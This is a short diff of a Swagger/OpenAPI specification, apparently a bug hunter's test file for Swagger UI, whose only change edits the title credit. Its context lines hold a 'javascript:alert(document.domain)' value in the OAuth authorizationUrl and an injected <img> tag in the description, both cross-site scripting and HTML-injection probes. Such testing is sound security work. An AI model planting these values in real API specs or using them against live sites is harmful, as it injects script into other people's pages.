@@ -5,7 +5,7 @@ securityDefinitions:
     authorizationUrl: javascript:alert(document.domain)//
 info:
   version: "1.0.0"
-  title: Bug Hunting is an Art & I (@iamarit) am an Artist!
+  title: Bug Hunting is an Art & I am an Artist!  __ @iamarit
   description: <img src=https://raw.githubusercontent.com/iamarit/SwaggerUiTesting/main/test.png>
 paths:
   /:
